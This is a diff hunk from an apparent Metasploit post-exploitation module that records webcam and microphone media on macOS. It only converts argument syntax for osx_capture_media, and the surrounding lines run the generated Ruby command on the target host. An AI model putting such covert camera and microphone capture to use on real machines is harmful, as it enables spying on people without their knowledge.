@@ -63,19 +63,19 @@ class Metasploit3 < Msf::Post
     num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
     tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
     ruby_cmd = osx_capture_media(
-      :action => action.name.downcase,
-      :snap_filetype => datastore['SNAP_FILETYPE'],
-      :audio_enabled => datastore['AUDIO_ENABLED'],
-      :video_enabled => true,
-      :num_chunks => num_chunks,
-      :chunk_len => datastore['SYNC_WAIT'],
-      :video_device => datastore['CAMERA_INDEX'],
-      :audio_device => datastore['MIC_INDEX'],
-      :snap_jpg_compression => datastore['JPG_QUALITY'].to_f,
-      :video_compression => datastore['VIDEO_COMPRESSION'],
-      :audio_compression => datastore['AUDIO_COMPRESSION'],
-      :record_file => tmp_file,
-      :snap_file => tmp_file+datastore['SNAP_FILETYPE']
+      action: action.name.downcase,
+      snap_filetype: datastore['SNAP_FILETYPE'],
+      audio_enabled: datastore['AUDIO_ENABLED'],
+      video_enabled: true,
+      num_chunks: num_chunks,
+      chunk_len: datastore['SYNC_WAIT'],
+      video_device: datastore['CAMERA_INDEX'],
+      audio_device: datastore['MIC_INDEX'],
+      snap_jpg_compression: datastore['JPG_QUALITY'].to_f,
+      video_compression: datastore['VIDEO_COMPRESSION'],
+      audio_compression: datastore['AUDIO_COMPRESSION'],
+      record_file: tmp_file,
+      snap_file: tmp_file+datastore['SNAP_FILETYPE']
     )
 
     output = cmd_exec(['ruby', '-e', ruby_cmd].shelljoin)
